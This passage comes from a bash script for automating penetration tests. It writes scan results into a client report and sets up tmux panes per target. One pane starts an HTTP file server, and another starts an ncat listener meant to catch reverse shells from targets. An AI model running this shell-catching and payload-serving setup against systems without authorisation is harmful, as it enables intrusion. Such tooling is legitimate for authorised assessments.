					dirb_443="$(cat $custom_path$client_name/targets/$target/scans/web/dirb-443.txt | sed 's~  ~\t~g' | sed 's~\\~\\\\~g' | sed 's~<~\\\&lt\;~g' | sed 's~>~\\\&gt\;~g' | sed ':a;N;$!ba;s~\n~<text:line-break/>~g')" # Remove newlines from file and various other annoyances
					sed -i 's~<web_scan/>~<text:p text:style-name=\"T23\">Results from dirb scan on port 443</text:p><text:p text:style-name=\"_31_234_20_Console_20_Output_20_ANSI\">'"$dirb_443"'</text:p><text:p text:style-name=\"T23\"/><web_scan/>~' content.xml
					echo -n "."
					$sleeps
				fi
				if [ -f $custom_path$client_name/targets/$target/scans/web/gobuster-80.txt ]; then
					gobuster_80="$(cat $custom_path$client_name/targets/$target/scans/web/gobuster-80.txt | sed 's~  ~\t~g' | sed 's~\\~\\\\~g' | sed 's~<~\\\&lt\;~g' | sed 's~>~\\\&gt\;~g' | sed ':a;N;$!ba;s~\n~<text:line-break/>~g')" # Remove newlines from file and various other annoyances
					sed -i 's~<web_scan/>~<text:p text:style-name=\"T23\">Results from gobuster scan on port 80</text:p><text:p text:style-name=\"_31_234_20_Console_20_Output_20_ANSI\">'"$gobuster_80"'</text:p><text:p text:style-name=\"T23\"/><web_scan/>~' content.xml
					echo -n "."
					$sleeps
				fi
				if [ -f $custom_path$client_name/targets/$target/scans/web/gobuster-443.txt ]; then
					gobuster_443="$(cat $custom_path$client_name/targets/$target/scans/web/gobuster-443.txt | sed 's~  ~\t~g' | sed 's~\\~\\\\~g' | sed 's~<~\\\&lt\;~g' | sed 's~>~\\\&gt\;~g' | sed ':a;N;$!ba;s~\n~<text:line-break/>~g')" # Remove newlines from file and various other annoyances
					sed -i 's~<web_scan/>~<text:p text:style-name=\"T23\">Results from gobuster scan on port 443</text:p><text:p text:style-name=\"_31_234_20_Console_20_Output_20_ANSI\">'"$gobuster_443"'</text:p><text:p text:style-name=\"T23\"/><web_scan/>~' content.xml
					echo -n "."
					$sleeps
				fi
				sed -i "s~<web_scan/>~~g" content.xml # Finish up by making sure to remove the <web_scan/> tag so it's not found on the next loop
				echo -n "."
				$sleeps

				### PORT & SERVICE TABLE ROW ###
				if [ -s $custom_path$client_name/targets/$target/scans/nmap/nmap-version-tcp.gnmap ]; then
					tcp_port_service="$(cat $custom_path$client_name/targets/$target/scans/nmap/nmap-version-tcp.gnmap | awk -F 'Ports: ' '{print $2}' | tr ',' '\n' | grep 'open' | sed 's~^ ~~' | awk -F '/' '{print $1, "("$7"), "}' | tr -d '\n' | sed 's~$, ~~' | sed s'~, $~~')"
					echo -n "."
					$sleeps
				else
					tcp_port_service="No open ports found!"
					echo -n "."
					$sleeps
				fi
				if [ -f $custom_path$client_name/targets/$target/scans/nmap/nmap-version-udp.gnmap ]; then
					udp_port_service="$(cat $custom_path$client_name/targets/$target/scans/nmap/nmap-version-udp.gnmap | awk -F 'Ports: ' '{print $2}' | tr ',' '\n' | grep 'open' | sed 's~^ ~~' | awk -F '/' '{print $1, "("$7"), "}' | tr -d '\n' | sed 's~$, ~~' | sed s'~, $~~')"
					echo -n "."
					$sleeps
				else
					udp_port_service="No open ports found!"
					echo -n "."
					$sleeps
				fi
				target_ip_only="$(echo $target | cut -d '-' -f 1)"
				service_table_content="<table:table-row table:style-name=\"Table1.1\"><table:table-cell table:style-name=\"Table1.A2\" office:value-type=\"string\"><text:p text:style-name=\"P42\">$target_ip_only</text:p></table:table-cell><table:table-cell table:style-name=\"Table1.B2\" office:value-type=\"string\"><text:p text:style-name=\"P40\"><text:span text:style-name=\"T10\"><text:s/>TCP:</text:span><text:span text:style-name=\"T3\"> </text:span><text:span text:style-name=\"T8\">$tcp_port_service</text:span><text:line-break/> <text:span text:style-name=\"T16\">UDP:</text:span><text:span text:style-name=\"T7\"> </text:span><text:span text:style-name=\"T8\">$udp_port_service</text:span></text:p></table:table-cell></table:table-row><service_row/>"
				sed -i "s~<service_row/>~$service_table_content~g" content.xml
				echo -n "."
				$sleeps
			done

			sed -i "s~<service_row/>~~g" content.xml # Remove the search tag, it's not needed anymore
			echo "."
			$sleeps

			echo $txtgry" -  Stitching the report back up and tidying up"$txtrst
			zip $custom_path$client_name/report/report-$client_name.odt -u content.xml &> /dev/null
			zip $custom_path$client_name/report/report-$client_name.odt -u styles.xml &> /dev/null
			zip $custom_path$client_name/report/report-$client_name.odt -u meta.xml &> /dev/null
			rm content.xml
			rm styles.xml
			rm meta.xml
			$sleeps
		fi
	fi
}

tmuxitup()
{
	if [ -z $enable_tmux ]; then # -T
		echo $txtblu$txtbld"[i] tmux not enabled, skipping..." $txtrst &> /dev/null
	else
		if command -v tmux >/dev/null 2>&1; then # Check if tmux is installed first, skip if not
			echo $txtblu$txtbld"[!] Setting up tmux session"$txtrst
			cd $custom_path$client_name
			if ! tmux has-session -t $client_name 2>/dev/null
			then
				# Start a new tmux session - with a workaround (https://superuser.com/questions/354844/cannot-resize-tmux-pane-from-bash-script)
				set -- $(stty size) # takes the output of current terminal window into args that we will use next
				tmux new -s $client_name -d -x "$2" -y "$(($1 - 1))" # The status bar uses one row so take it off the total rows

				# Colors
				tmux set-option -t $client_name status-style "bg=$tmux_status_bg_color"
				tmux set-option -a -t $client_name status-style "fg=$tmux_status_fg_color"
				tmux set-option -t $client_name pane-active-border-style "bg=$tmux_status_fg_color"
				tmux set-option -a -t $client_name pane-active-border-style "fg=$tmux_status_bg_color"

				# Set status strings
				tmux set-option -t $client_name status-interval 1
				#tmux set-option -t $client_name status-left "" # leaving it blank for now
				tmux set-option -t $client_name status-right '#(for i in $(ip addr show | grep "<" | cut -d ":" -f 2 | sed "s/ //g" | grep -v "lo"); do echo -n "$i: $(ip addr show $i | grep "inet " | cut -d " " -f 6 | cut -d "/" -f 1) | "; done | sed "s/..$//")'
				tmux set-option -t $client_name status-right-length 150
				tmux set-option -t $client_name status-left-length 100

				# Increase the buffer size
				tmux set-option -t $client_name history-limit 8192 # default is around 2000... i think?

				# Create window for shells, start web server - first window (0)
				tmux_window_count=0 # keep track of how many windows we open, initialise here at 0
				tmux rename-window -t $client_name Shells
				tmux send-keys -t $client_name "cd /var/www/html/ && python -m SimpleHTTPServer 80" C-m
				tmux split-window -v -t $client_name
				tmux send-keys -t $client_name "nc -nlvp $shell_port --allow $target_range -o $custom_path$client_name/ncat-$client_name-$target_ip-$(date +'%d-%m-%Y-%H-%M-%S').log" C-m
				tmux split-window -v -t $client_name
				tmux send-keys -t $client_name "ls" C-m
				tmux resize-pane -t $client_name:0.2 -U 100 # Ah... push it good!

				# Create target windows with panes for each target found
				for i in $(ls $custom_path$client_name/targets/); do
					tmux_window_count=$((tmux_window_count+1)) # keep track of how many windows we have generated
					tmux new-window -t $client_name
					tmux rename-window -t $client_name $i
					tmux send-keys -t $client_name "cd $custom_path$client_name/targets/$i" C-m
					tmux send-keys -t $client_name "ls -la" C-m
					tmux split-window -v -t $client_name
					tmux send-keys -t $client_name "cd $custom_path$client_name/targets/$i" C-m
					tmux resize-pane -t $client_name:$tmux_window_count.1 -U 28 # Push it real good!

					if [ ! -f $custom_path$client_name/targets/$i/notes.txt ]; then
						echo ":::: $client_name : $target_ip : NOTES ::::" > $custom_path$client_name/targets/$i/notes.txt
						tmux send-keys -t $client_name "nano $custom_path$client_name/targets/$i/notes.txt 2>/dev/null || vim $custom_path$client_name/targets/$i/notes.txt" C-m # if nano isn't there vim will be!
					else
						tmux send-keys -t $client_name "nano $custom_path$client_name/targets/$i/notes.txt 2>/dev/null || vim $custom_path$client_name/targets/$i/notes.txt" C-m # if nano isn't there vim will be!
					fi
				done
			else
				echo $txtgry" -  A tmux session already exists for: $txtbld$client_name"$txtrst 
				#tmux kill-session -t $client_name
				$sleeps
			fi
			
		    # Move focus to the specific window
		    tmux select-window -t $client_name:0 # 0 NOTES, 1 TARGET#
			#tmux attach -t $client_name # currently the script log isn't stopped at the end so i think attaching before the script has finished will cause major issues (logging the interactive tmux session, goodbye memory!)
			echo $txtgry" -  Use the following command to attach to the session:$txtbld tmux a -t $client_name"$txtrst
			echo $txtgry" -  Advisory: Avoid nesting in tmux locally, unless you know what your about!"$txtrst
			$sleeps
		else
			read -p "[?] tmux not found, would you like to download and install it using apt? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
  			apt update && apt install tmux -y # designed for kali, not fussed if you can't use apt :P
			echo $txtgry$txtbld" -  Let's try that again..."$txtrst
			$sleeps
			tmuxitup
		fi
	fi
}

### MAIN ###
clear
## CHECK NO ARGS ###
# I'm having issues getting this to work inside a function but it's not repeated so doesn't really matter, would be nice to have everything in its place though TODO
if [ $# -eq 0 ]; then
	$sleeps
	banner
	echo $txtgry"[!] No arguments specified"$txtrst
	echo ""
    show_usage
	show_help
    exit 1
fi

# Create a log, it's definatey not be the best way... a stop logging function at the end would be better... but it'll do for now!
touch $HOME/.pentidy.log
exec >  >(tee -ia $HOME/.pentidy.log)
exec 2> >(tee -ia $HOME/.pentidy.log >&2) #stderr

banner

### GETOPTS ###
# also having issues getting getopts to work inside a function but it's not repeated, would be nice to have everything in its own place TODO
while getopts ':i:t:c:d:p:O:hugvrmFRTV' opt; do
	case "$opt" in
		i)
			$sleeps
			network_interface=${OPTARG}
			target_range=${OPTARG}
			ip addr show $network_interface up &> /dev/null
			if [ $? -eq 1 ]; then
				echo " $txtred$txtcro$txtgry  Network interface: $txtyel$network_interface$txtrst$txtgry not found... quitting!"$txtrst
				$sleeps
				echo ""
				exit 1
			else
				if [[ $(ip address show $network_interface | grep "inet " | cut -d " " -f 6 | cut -d "/" -f 1) == "" ]]; then
					echo " $txtred$txtcro$txtgry  Unable to get an IP from $network_interface, please check it is actually up... quitting!"$txtrst
					$sleeps
					exit 1
				else
					target_range="$(ip address show $network_interface | grep "inet " | cut -d " " -f 6)"
					local_ip="$(ip address show $network_interface | grep "inet " | cut -d " " -f 6 | cut -d "/" -f 1)"
				fi
			fi
			;;
		t)
			target_range=${OPTARG}
			# Currently, the target range must be specified in order after the interface (-i) or it will be overwritten again with the default (eth0) subnet range value, my head hurts :( FIXME
			;;
		d)
			domain=${OPTARG}
			;;
		c)
			client_name=${OPTARG}
			;;
		h)
			$sleeps
			show_usage
			show_help
			exit 0
			;;
		r)
			$sleeps
			echo $txtgry" -  Running with defaults!"$txtrst
			;;
		m) # Having issues getting a consistent scan in testing
			$sleeps
			enable_masscan="active"
			echo $txtgry" -  Using masscan for initial portscan!"$txtrst
			;;
		u)
			$sleeps
			enable_unicorn="active"
			echo $txtgry" -  Using unicornscan for initial portscan!"$txtrst
			;;
		g)
			$sleeps
			dubdub_buster="active"
			echo $txtgry" -  Using gobuster instead of dirb!"$txtrst
			;;
		V)
			$sleeps
			echo $txtblu"[i] $0 version:$txtyel v$script_version$txtrst"
			$sleeps
			echo ""
			exit 0
			;;
		p)
			custom_path=${OPTARG}$(case $OPTARG in */);; *) echo "/";; esac) # if there is no forward slash, add one!
			;;
		F)
			force="active"
			$sleeps
			echo $txtgry" -  We are confident with our args!"$txtrst
			$sleeps
			;;
		O)
			ip_omit=${OPTARG}
			echo $txtgry" -  Omitting IP: $txtbld$ip_omit"$txtrst
			;;
		T)
			$sleeps
			enable_tmux="active"
			echo $txtgry" -  Setting up tmux session on completion"$txtrst
			;;
		R)
			$sleeps
			enable_report="active"
			echo $txtgry" -  Report requested!"$txtrst
			;;
		v)
			$sleeps
			verbose="active"
			#echo $txtgry" -  Verbose mode enabled (showing commands used)"$txtrst
			echo $txtgry" -  Verbose mode not yet implemented"$txtrst
			;;
		\?)
			$sleeps
			echo $txtblu"[!] Invalid option specified"$txtrst
			echo ""
			show_usage
			show_help
			exit 1
			;;
		*)
			$sleeps
			echo $txtblu"[!] Flag requires an argument"$txtrst
			echo ""
			show_usage
			show_help
			exit 1
			;;
	esac
done

givemeallyougot # https://www.youtube.com/watch?v=Cl5OwoP_EuY
check_dependancies
SECONDS=0 # used to start the timer, called again at the end of the script to show elapsed time
echo $txtblu$txtbld"[%] Scan started on: $txtrst$txtblu$(date)"$txtrst
$sleeps
build_env
pick_lick_roll_flick_tcp
#pick_lick_roll_flick_udp
#dns_scan
#web_scan
#smb_enum
#msf_payloads
#rev_shells
#msf_import
hostname_lookup # more reliable with slower nmap scans -T3 and lower
#report_custom # need a better way of searching and replacing, currently using ~ as a delimeter with sed but have now found it in a scan so it breaks...
#screenshot_save # buggy
duration=$SECONDS # End
echo $txtblu$txtbld"[%] Scan finished on: $txtrst$txtblu$(date), it took $(($duration / 60)) minutes and $(($duration % 60)) seconds"$txtrst

# Move log
mv $HOME/.pentidy.log $custom_path$client_name/
echo $txtgry" -  Created log, moved to: file://$custom_path$client_name/.pentidy.log"$txtrst

tmuxitup

# Remove ansi colour codes from log
sed -i 's/\x1b\[[0-9;]*m//g' $custom_path$client_name/.pentidy.log


exit 0
